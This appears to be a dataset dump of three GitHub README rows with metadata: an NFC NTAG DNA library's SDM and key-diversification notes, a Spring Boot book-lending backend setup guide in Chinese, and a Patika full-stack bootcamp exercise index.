SDM has a lot of options, so just picking a starting point is sometimes difficult.

Personally, my preferred method is to create an NDEF URL that looks like this: ""https://www.example.com/tagread/{UID}{COUNTER}/{MAC}""

Basically, this puts the UID and counter in plaintext.
This means that if something is scanning but is not connected to the Internet, it can in fact read the UID off of the card from the URL.
But, if you are connected to the Internet, it can do additional validation.

For general purposes, I personally recommend any additional information be stored on the server and retrieved rather than encoded into the card.
It just makes life easier, because then you just have an NDEF record to deal with, and you can easily link the data to the card after-the-fact with minimal tooling.
Basically, you have a card programmer, and, after the cards are programmed with your keys/URL, you can use other devices to tie those cards to something, and they don't need your encryption keys to do it.


## Key diversification

Key diversification allows you to have a different key on each device so that if someone were to steal the keys from the tag (which is itself a very difficult thing to do) it would not help them to know the keys for the other tags.

On the other hand, for key diversification to work, you need to know *which* key is on *which* device.
The standard way of doing this is by having a single master key which gets diversified by doing a CMAC using the master key with a combination of the tag's UID and some additional data known as the ""diversification data"" (this is used mostly to make sure the data is long enough to get a good CMAC).

Generally, the diversification data is constructed as follows.  
First, decide on a ""system identifier"".
This is a few bytes which is often an ASCII-ized version of your application name.
If your application is named ""foo"" then your system identifier is `new byte[] {0x66, 0x6f, 0x6f}`.
Then, use the `KeyInfo` class to construct your key.
Note that there is also an ""application identifier"" available.
I am not clear what that is supposed to be, but the document this is based on (AN10922) uses the ""3-byte DESfire AID"" (0x3042F5) in its example, so that is the default here.

```
byte[] masterKey = new byte[]{ /* Your master key here */ };
KeyInfo keyInfo = new KeyInfo();
keyInfo.key = masterKey;
keyInfo.systemIdentifier = new byte[] {0x66, 0x6f, 0x6f};
keyInfo.diversifyKeys = true; 
byte[] cardKey = keyInfo.generateKeyForCardUid(uidBytes);
```

Note that usually the key that is used for encrypting PICC data (if any) is *not* diversified, because you need to know that key *before* you know the UID.
Then, once the UID is obtained, then that can be used to generate a UID-specific diversified key that is used for the file data encryption (if any) and the MAC (which is almost always used).

I think the general convention is to use App Key 2 for your non-diversified PICC encryption key, and then use App Key 3 for your diversified key.
Note, however, that your diversified key SHOULD NOT be just a diversification of your non-diversified key.
It should be based on a *separate* master key.
Otherwise, if someone were to decode one of your tags, obtaining the key would give them all the information they needed to generate and fake diversified keys.
Keeping the master key for your diversified keys secret is an absolute imperative for the system to work.

## Generating Keys

An easy way to generate a key is with the following command:

```
head -c 16 /dev/random|xxd -p
```
",0,7,3,mit,1.0,"['nxp', 'ntag', 'dna', 'library', 'note', 'consider', 'series', 'still', 'development', 'breaking', 'change', 'occur', 'time', 'first', 'stable', 'release', 'due', 'combination', 'factor', 'mostly', 'centered', 'around', 'inexperience', 'java', 'packaging', 'trying', 'get', 'something', 'work', 'library', 'meant', 'help', 'handling', 'nxp', 'ntag', 'dna', 'chip', 'note', 'library', 'completely', 'hardware', 'agnostic', 'requires', 'adding', 'transceiver', 'manage', 'nfc', 'hardware', 'detail', 'see', 'usage', 'section', 'note', 'much', 'expect', 'thing', 'moved', 'around', 'renamed', 'quite', 'bit', 'time', 'current', 'api', 'considered', 'stable', 'library', 'primarily', 'based', 'nxp', 'document', 'available', 'page', 'number', 'often', 'referenced', 'code', 'revision', 'note', 'library', 'built', 'almost', 'entirely', 'referenced', 'document', 'real', 'experience', 'nfc', 'really', 'know', 'specific', 'chip', 'nxp', 'generally', 'standard', 'suggestion', 'refactor', 'support', 'nfc', 'tag', 'certainly', 'open', 'note', 'companion', 'library', 'reading', 'sun', 'message', 'chip', 'generate', 'important', 'document', 'read', 'dna', 'application', 'note', 'hint', 'nxp', 'dna', 'lrp', 'mode', 'application', 'note', 'hint', 'nxp', 'building', 'library', 'built', 'maven', 'build', 'produce', 'jar', 'file', 'named', 'installing', 'install', 'copy', 'jar', 'built', 'previous', 'section', 'jar', 'folder', 'android', 'project', 'usually', 'directory', 'example', 'android', 'project', 'directory', 'android', 'project', 'us', 'library', 'contains', 'built', 'jar', 'ineeds', 'updating', 'run', 'directory', 'main', 'directory', 'copy', 'new', 'version', 'usage', 'intended', 'usage', 'library', 'within', 'android', 'project', 'though', 'written', 'could', 'used', 'nfc', 'hardware', 'basic', 'information', 'nfc', 'tag', 'reading', 'android', 'available', 'assuming', 'discovered', 'tag', 'intent', 'named', 'code', 'use', 'library', 'follows', 'way', 'code', 'work', 'split', 'four', 'basic', 'part', 'main', 'dnacommunicator', 'class', 'handle', 'packaging', 'command', 'communication', 'channel', 'including', 'encrypted', 'session', 'management', 'individual', 'class', 'roughly', 'correspond', 'command', 'spec', 'usually', 'one', 'static', 'method', 'named', 'perform', 'task', 'first', 'argument', 'always', 'dnacommunicator', 'object', 'command', 'could', 'easily', 'added', 'without', 'junking', 'main', 'dnacommunicator', 'class', 'currently', 'reside', 'package', 'encryption', 'mode', 'class', 'class', 'handle', 'actual', 'encryption', 'mac', 'processing', 'static', 'method', 'run', 'initiate', 'session', 'utility', 'function', 'constant', 'lrp', 'encryption', 'library', 'support', 'lrp', 'primitive', 'encryption', 'mode', 'however', 'configure', 'tag', 'use', 'lrp', 'lrp', 'mode', 'switched', 'back', 'aes', 'mode', 'set', 'tag', 'lrp', 'mode', 'authenticate', 'shown', 'aes', 'encryption', 'mode', 'available', 'tag', 'get', 'back', 'need', 'change', 'authentication', 'function', 'lrp', 'encryption', 'based', 'nxp', 'document', 'available', 'page', 'number', 'version', 'also', 'note', 'go', 'implementation', 'lrp', 'available', 'secure', 'dynamic', 'messaging', 'sdm', 'library', 'utility', 'function', 'performing', 'sdm', 'generating', 'sun', 'secure', 'unique', 'nfc', 'message', 'currently', 'flux', 'way', 'work', 'right', 'follows', 'create', 'sdmsettings', 'object', 'set', 'file', 'permission', 'sdmsettings', 'object', 'create', 'ndeftemplatemaster', 'object', 'set', 'whether', 'lrp', 'use', 'create', 'structured', 'url', 'using', 'component', 'sdm', 'pas', 'url', 'sdmsettings', 'ndeftemplatemaster', 'object', 'get', 'resulting', 'file', 'data', 'write', 'file', 'data', 'ndef', 'file', 'change', 'file', 'setting', 'ndef', 'file', 'use', 'new', 'sdmsettings', 'object', 'step', 'probably', 'removed', 'point', 'functionality', 'integrated', 'another', 'class', 'probably', 'may', 'also', 'incorporate', 'special', 'command', 'make', 'easier', 'example', 'code', 'tag', 'using', 'sdm', 'note', 'offset', 'match', 'requirement', 'template', 'template', 'piece', 'include', 'mirror', 'uid', 'mirror', 'sdm', 'read', 'counter', 'put', 'encrypted', 'picc', 'data', 'encrypted', 'sdmmetareadperm', 'key', 'set', 'sure', 'set', 'useslrp', 'ndefmastertemplate', 'object', 'affect', 'size', 'picc', 'data', 'put', 'encrypted', 'secret', 'data', 'encrypted', 'sdmfilereadperm', 'key', 'set', 'sure', 'set', 'filedatalength', 'ndefmastertemplate', 'object', 'put', 'mac', 'data', 'set', 'start', 'location', 'used', 'mac', 'calculation', 'unset', 'becomes', 'location', 'start', 'mac', 'indicating', 'mac', 'picc', 'data', 'encrypted', 'file', 'data', 'set', 'start', 'encrypted', 'file', 'data', 'personally', 'like', 'use', 'rather', 'connection', 'issue', 'internet', 'least', 'know', 'uid', 'tag', 'wanting', 'even', 'ca', 'fully', 'validate', 'sdm', 'validation', 'also', 'use', 'library', 'side', 'validate', 'sdm', 'message', 'read', 'content', 'unencrypted', 'picc', 'data', 'following', 'uid', 'mirrored', 'set', 'null', 'readcounter', 'mirrored', 'set', 'encrypted', 'picc', 'data', 'following', 'note', 'key', 'decrypting', 'picc', 'data', 'different', 'key', 'validating', 'mac', 'decrypting', 'file', 'data', 'therefore', 'set', 'key', 'validate', 'mac', 'use', 'empty', 'byte', 'array', 'message', 'one', 'sdm', 'setup', 'section', 'describes', 'common', 'way', 'configure', 'sdm', 'sdm', 'lot', 'option', 'picking', 'starting', 'point', 'sometimes', 'difficult', 'personally', 'preferred', 'method', 'create', 'ndef', 'url', 'look', 'like', 'http', 'uid', 'counter', 'mac', 'basically', 'put', 'uid', 'counter', 'plaintext', 'mean', 'something', 'scanning', 'connected', 'internet', 'fact', 'read', 'uid', 'card', 'url', 'connected', 'internet', 'additional', 'validation', 'general', 'purpose', 'personally', 'recommend', 'additional', 'information', 'stored', 'server', 'retrieved', 'rather', 'encoded', 'card', 'make', 'life', 'easier', 'ndef', 'record', 'deal', 'easily', 'link', 'data', 'card', 'minimal', 'tooling', 'basically', 'card', 'programmer', 'card', 'programmed', 'use', 'device', 'tie', 'card', 'something', 'need', 'encryption', 'key', 'key', 'diversification', 'key', 'diversification', 'allows', 'different', 'key', 'device', 'someone', 'steal', 'key', 'tag', 'difficult', 'thing', 'would', 'help', 'know', 'key', 'tag', 'hand', 'key', 'diversification', 'work', 'need', 'know', 'key', 'device', 'standard', 'way', 'single', 'master', 'key', 'get', 'diversified', 'cmac', 'using', 'master', 'key', 'combination', 'tag', 'uid', 'additional', 'data', 'known', 'diversification', 'data', 'used', 'mostly', 'make', 'sure', 'data', 'long', 'enough', 'get', 'good', 'cmac', 'generally', 'diversification', 'data', 'constructed', 'follows', 'first', 'decide', 'system', 'identifier', 'byte', 'often', 'version', 'application', 'name', 'application', 'named', 'foo', 'system', 'identifier', 'use', 'class', 'construct', 'key', 'note', 'also', 'application', 'identifier', 'available', 'clear', 'supposed', 'document', 'based', 'us', 'desfire', 'aid', 'example', 'default', 'note', 'usually', 'key', 'used', 'encrypting', 'picc', 'data', 'diversified', 'need', 'know', 'key', 'know', 'uid', 'uid', 'obtained', 'used', 'generate', 'diversified', 'key', 'used', 'file', 'data', 'encryption', 'mac', 'almost', 'always', 'used', 'think', 'general', 'convention', 'use', 'app', 'key', 'picc', 'encryption', 'key', 'use', 'app', 'key', 'diversified', 'key', 'note', 'however', 'diversified', 'key', 'diversification', 'key', 'based', 'separate', 'master', 'key', 'otherwise', 'someone', 'decode', 'one', 'tag', 'obtaining', 'key', 'would', 'give', 'information', 'needed', 'generate', 'fake', 'diversified', 'key', 'keeping', 'master', 'key', 'diversified', 'key', 'secret', 'absolute', 'imperative', 'system', 'work', 'generating', 'key', 'easy', 'way', 'generate', 'key', 'following', 'command']","['key', 'data', 'library', 'note', 'tag']",6,0,0,"['nxp', 'ntag', 'dna', 'library', 'building', 'instal', 'example', 'android', 'project', 'usage', 'lrp', 'encryption', 'secure', 'dynamic', 'messaging', 'sdm', 'sdm', 'validation', 'sdm', 'setup', 'key', 'diversification', 'generate', 'key']",11,"['sdm', 'key', 'nxp', 'ntag', 'dna']",9,18.0,1.0,"[maven-clean-plugin,maven-compiler-plugin,maven-deploy-plugin,maven-install-plugin,maven-jar-plugin,maven-project-info-reports-plugin,maven-resources-plugin,maven-site-plugin,maven-surefire-plugin]",0.0,1.0,0.0,13323,20.32692307692308,4.8746452223273415,"['here -> https://www.nxp.com/docs/en/data-sheet/NT4H2421Gx.pdf', 'here -> https://github.com/johnnyb/nfc-sun-decoder', 'NXP AN12196 -> https://www.nxp.com/docs/en/application-note/AN12196.pdf', 'NXP AN12321 -> https://www.nxp.com/docs/en/application-note/AN12321.pdf', 'here -> https://developer.android.com/develop/connectivity/nfc/nfc', 'here -> https://www.nxp.com/docs/en/application-note/AN12304.pdf', 'here -> https://github.com/johnnyb/gocrypto']",7
caolib/book_management_system,master,"[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=cascadia+code&size=38&duration=3500&pause=1000&color=00ADFF&center=true&vCenter=true&random=false&width=1000&height=100&lines=Book+lending+management+system;图书借阅管理系统)](https://git.io/typing-svg)

&emsp;&emsp;

![springboot](https://img.shields.io/badge/springboot-v3.0.9-%236DB33F?style=flat&logo=springboot&logoColor=236DB33F&labelColor=white)
![maven](https://img.shields.io/badge/Maven-v3.9.5-blue?style=flat&logo=apachemaven&logoColor=red&labelColor=white)
![mybatisplus](https://img.shields.io/badge/MybatisPlus-v3.5.3.1-red?style=flat&labelColor=white)
![mysql](https://img.shields.io/badge/MySQL-v8.2.0-blue?style=flat&logo=mysql&logoColor=blue&labelColor=white)
![redis](https://img.shields.io/badge/Redis-v7.0.12-red?style=flat&logo=redis&logoColor=%23DC382D&labelColor=white)
![GitHub Release](https://img.shields.io/github/v/release/tankingcao/java_design?include_prereleases&sort=date&display_name=release&style=flat&labelColor=red&cacheSeconds=3600)
![下载量](https://img.shields.io/github/downloads/caolib/book_management_system/total.svg)

<!-- 
![GitHub License](https://img.shields.io/github/license/caolib/book_management_system?style=flat)
![opened issues](https://img.shields.io/github/issues/caolib/book_management_system?color=red&cacheSeconds=3600)
![closed issues](https://img.shields.io/github/issues-closed/caolib/book_management_system?color=green&cacheSeconds=3600)
![GitHub commit activity](https://img.shields.io/github/commit-activity/y/caolib/book_management_system?labelColor=red)
-->

使用`springboot+mybatis-plus`框架制作的一个简单的图书借阅管理系统后台服务器

> [!important]
>
> **项目采用前后端分离开发，这是后端项目，对应的[前端项目地址](https://github.com/caolib/vue3-vite)，注意相关技术栈版本不要相差太大**

> [!caution]
>
> - **最近更新中因为使用`redis`二次校验token实现token主动过期，`redis`变成必需项!!!**
> - **在[发行版](https://github.com/caolib/book_management_system/releases)的资源中有此项目对应的数据库结构的`sql`文件**

> [!tip]
> - 使用前先使用maven下载相关依赖，建议使用IDEA编译器，捆绑了maven，可以直接使用
> - 注意前后端一般是同时修改的，必须匹配版本，没有特别需求（不想使用redis）直接使用最新的

## 快速开始

### 1.参照注释修改配置文件

路径：`src/main/resources/application.yml`

```yml
# 项目启动端口，默认8080，修改后前端中的请求地址也要对应修改
server:
  port: 8080

# mybatis-plus配置
mybatis-plus:
  configuration:
    map-underscore-to-camel-case: true # 下划线命名转驼峰
  type-aliases-package: com.clb.domain # 别名扫描包
  mapper-locations: classpath:mapper/*.xml # mapper文件扫描

spring:
  # mysql
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/java_design?serverTimezone=Asia/Shanghai
    # 注意修改用户名和密码为你自己的
    username: root
    password: 123456
    type: com.alibaba.druid.pool.DruidDataSource

  # redis
  data:
    redis:
      # 修改host和密码为你的，如果没有密码则删除password项，redis默认没有密码
      host: localhost
      password: 123456
      port: 6379
      database: 0
      timeout: 5000ms
  cache:
    type: redis  
    redis:
      time-to-live: 3600000 # 缓存过期时间,单位ms(此处一小时)

  # 热重载排除advice文件
  devtools:
    restart:
      additional-exclude: com/clb/util/Advice.class
  # 支持控制台ansi颜色输出(使用java命令行部署时),如果乱码则删除下面3行
  output:
    ansi:
      enabled: always
      
# 日志
logging:
  level:
    com.clb: debug
  pattern:
    dateformat: MM-dd HH:mm:ss.SSS

```

### 2.启动项目

使用编译器一键启动项目(前提:mysql和redis数据库配置正确且已经启动)

## 项目目录结构

- `src/main/java/com/clb/`
  - `config`：配置文件
  - `constant`：枚举字段
  - `controller`：表现层
  - `domain`：实体类等
  - `exception`：异常类
  - `handle`：处理器类
  - `interceptor`：拦截器类
  - `mapper`：持久层
  - `service`：业务层
  - `util`：工具类
- `src/main/resources`
  - `mapper`：映射文件mapper
  - `application.yml`：配置文件
  - `banner.txt`：spring项目启动logo
- `src/test/`：测试类
- `pom.xml`：依赖管理

## 打包使用

> 将项目使用maven打成jar包后可以通过命令行执行jar包

```cmd
java -jar .\book-1.0.0.RELEASE.jar
```

> 可以修改端口号

```cmd
java -jar .\book-1.0.0.RELEASE.jar --server.port=8081
```

> ~也可以关闭redis~

```cmd
java -jar .\book-1.0.0.RELEASE.jar --server.port=8081 --spring.cache.type=none
```

> [!tip]
> 此项目对应的[微服务版本](https://github.com/caolib/cloud-book)

## 提交分析
![Alt](https://repobeats.axiom.co/api/embed/fff6dbaa9aa86bbe35a974910b89f89dd10a3383.svg ""Repobeats analytics image"")

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=caolib/book_management_system,caolib/vue3-vite&type=Timeline)](https://star-history.com/#caolib/book_management_system&caolib/vue3-vite&Timeline)
",1,0,1,mit,0.0,"['important', 'caution', 'tip', 'tip', 'star', 'history']","['tip', 'important', 'caution', 'star', 'history']",0,0,0,"['mysql', 'redis', 'star', 'history']",20,"['mysql', 'redis', 'star', 'history']",4,2.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,4288,33.5625,5.860335195530726,"['![Typing SVG -> https://readme-typing-svg.herokuapp.com?font=cascadia+code&size=38&duration=3500&pause=1000&color=00ADFF&center=true&vCenter=true&random=false&width=1000&height=100&lines=Book+lending+management+system;图书借阅管理系统', 'springboot -> https://img.shields.io/badge/springboot-v3.0.9-%236DB33F?style=flat&logo=springboot&logoColor=236DB33F&labelColor=white', 'maven -> https://img.shields.io/badge/Maven-v3.9.5-blue?style=flat&logo=apachemaven&logoColor=red&labelColor=white', 'mybatisplus -> https://img.shields.io/badge/MybatisPlus-v3.5.3.1-red?style=flat&labelColor=white', 'mysql -> https://img.shields.io/badge/MySQL-v8.2.0-blue?style=flat&logo=mysql&logoColor=blue&labelColor=white', 'redis -> https://img.shields.io/badge/Redis-v7.0.12-red?style=flat&logo=redis&logoColor=%23DC382D&labelColor=white', 'GitHub Release -> https://img.shields.io/github/v/release/tankingcao/java_design?include_prereleases&sort=date&display_name=release&style=flat&labelColor=red&cacheSeconds=3600', '下载量 -> https://img.shields.io/github/downloads/caolib/book_management_system/total.svg', 'GitHub License -> https://img.shields.io/github/license/caolib/book_management_system?style=flat', 'opened issues -> https://img.shields.io/github/issues/caolib/book_management_system?color=red&cacheSeconds=3600', 'closed issues -> https://img.shields.io/github/issues-closed/caolib/book_management_system?color=green&cacheSeconds=3600', 'GitHub commit activity -> https://img.shields.io/github/commit-activity/y/caolib/book_management_system?labelColor=red', '前端项目地址 -> https://github.com/caolib/vue3-vite', '发行版 -> https://github.com/caolib/book_management_system/releases', '微服务版本 -> https://github.com/caolib/cloud-book', 'Alt -> https://repobeats.axiom.co/api/embed/fff6dbaa9aa86bbe35a974910b89f89dd10a3383.svg ""Repobeats analytics image""', '![Star History Chart -> https://api.star-history.com/svg?repos=caolib/book_management_system,caolib/vue3-vite&type=Timeline']",17
semih-turan/The-Full-Stack-Web-Development-Bootcamp,main,"# The-Full-Stack-Web-Development-Bootcamp

[![Patika+ Türkiye'nin En Kapsamlı Web Developer Bootcamp'i](/readmeAssets/logo.png ""Patika+ Türkiye'nin En Kapsamlı Web Developer Bootcamp'i"")](https://patika.dev)

## The Full Stack Web Development Bootcamp Repository on Patika +

This repository serves as an extensive compilation of the projects and practice sessions completed throughout my journey with Patika+. As I advance through the program, each project and practice session is thoughtfully arranged into specific folders within this repository.

## Purpose

This repository serves as a comprehensive record of my learning journey, designed to document progress and provide a reference point for personal reflection and potential collaboration. Through its centralized structure, I aim to create an organized and accessible archive of my coding pursuits.

---

### Table of Contents

#### Backend Phase

 <details>
<summary>Week 1 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 1       | 1  | [Grade Point Average Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/GradePointAverageCalculator)|
| 1       | 2  | [VAT Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/VATCalculator)|
| 1       | 3  | [Triangle Area](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/TriangleArea)|
| 1       | 4  | [Taxi Meter](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/TaxiMeter)|
| 1       | 5  | [Circle Area](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/CircleArea)|
| 1       | 6  | [Body Mass Index](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/BodyMassIndex)|
| 1       | 7  | [Green Grocer Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/GreenGrocerCalculator)|
| 1       | 8  | [Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Calculator)|
| 1       | 9  | [Login](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Login)|
| 1       | 10 | [Passing Grade](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PassingGrade)|
| 1       | 11 | [Activity Recommendation](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/ActivityRecommendation)|
| 1       | 12 | [Horoscope](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Horoscope)|
| 1       | 13 | [Flight Ticket](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/FlightTicket)|
| 1       | 14 | [Chineese Zodiac](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Chinese%20Zodiac)|
| 1       | 15 | [Bissextile](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Bissextile)|
| 1       | 16 | [Even Numbers](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/EvenNumbers)|
| 1       | 17 | [Odd Numbers](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/OddNumbers)|
| 1       | 18 | [Power Scope](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PowerScope)|
| 1       | 19 | [Combination](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Combination)|
| 1       | 20 | [Exponents](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Exponents)|
| 1       | 21 | [Digit Sum](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/DigitSum)|
| 1       | 22 | [Harmonic Series](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/HarmonicSeries)|
| 1       | 23 | [Diamond](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Diamond)|
| 1       | 24 | [ATM](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/ATM)|
| 1       | 25 | [GDC and LCM Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/GdcLcmCalculator)|
| 1       | 26 | [Find Biggest Number](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/FindBiggestNumber)|
| 1       | 27 | [Perfect Number](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PerfectNumber)|
| 1       | 28 | [Inverted Triangle](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/InvertedTriangle)|
| 1       | 29 | [Prime Number](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PrimeNumber)|
| 1       | 30 | [Fibonacci Series](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/FibonacciSeries)|
| 1       | 31 | [Precedence](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Precedence)|
| 1       | 32 | [Casting](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Casting)|

</details>

<details>
<summary>Week 2 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 2       | 1  | [Polindrome](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/Polindrome)|
| 2       | 2  | [Advance Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/AdvanceCalculator)|
| 2       | 3  | [Recursive Exponential](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursiveExponential)|
| 2       | 4  | [Recursive Prime Number](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursivePrimeNumber)|
| 2       | 5  | [Recursive Pattern](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursivePattern)|
| 2       | 6  | [Recursive Pattern Second](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursivePatternSecond)|
| 2       | 7  | [Student Information System](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/StudentInformationSystem)|
| 2       | 8  | [Boxer Game](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/BoxerGame)|
| 2       | 9  | [Salary Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/SalaryCalculator)|
| 2       | 10 | [Harmonic Average](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/HarmonicAverage)||
| 2       | 11 | [Nearest Max Min](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/NearestMaxMin)|
| 2       | 12 | [PrintsB](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/PrintsB)|
| 2       | 13 | [Repeating Even Numbers](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RepeatingEvenNumbers)|
| 2       | 14 | [Sorting Arrays](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/SortingArrays)|
| 2       | 15 | [Freq Arrays](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/FreqArrays)|
| 2       | 16 | [Matrix Transpose](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/MatrixTranspose)|
| 2       | 17 | [Guess Number](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/GuessNumber)|
| 2       | 18 | [Palindrome Words](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/PalindromeWords)|
</details>

 <details>
<summary>Week 3 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 3       | 1  | [Mine Sweeper Game](https://github.com/semih-turan/Mine-Sweeper-Game)|

</details>

<details>
<summary>Week 4 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 4       | 1  | [Adventure Game](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/04-WeekFour/AdventureGame)|
| 4       | 2  | [List](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/04-WeekFour/List)|

</details>

<details>
<summary>Week 5 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 5       | 1  | [Try Catch Block](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/TryCatchBlock)|
| 5       | 2  | [Book Sorter](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/BookSorter)|
| 5       | 3  | [Word Frequency](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/WordFrequency)|
| 5       | 4  | [Patika Store](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/PatikaStore)|
| 5       | 5  |[SQL Assignments One](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/SQLAssignmentsOne)|

</details>

<details>
<summary>Week 6 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 6       | 1  |[SQL Assignments Two](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/SQLAssignmentsTwo)|
| 6       | 2  |[SQL Assignments Three](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/SQLAssignmentsThree)|
| 6       | 3  | [File Read Sum](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/FileReadSum)|
| 6       | 4  | [Notepad](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/Notepad)|
| 6       | 5  | [JDBCDB](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/JDBCDB)|

</details>

<details>
<summary>Week 7 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 7       | 1  |[Rent a Car](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/07-WeekSeven/RentACar)|


</details>

<details>
<summary>Week 8 Practices</summary>
<br>

- Feast of Ramadan
</details>


<details>
<summary>Week 9 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 9       | 1  | [Tourism Agency Management](https://github.com/semih-turan/Tourism-Agency-Management)|
</details>

<details>
<summary>Week 10 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 10       | 1  | [Tourism Agency Management](https://github.com/semih-turan/Tourism-Agency-Management)|
</details>

<details>
<summary>Week 11 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 11      | 1  |[Library Management System](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/11-WeekEleven/LibraryManagementSystem)|
</details>

<details>

<summary>Week 12 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
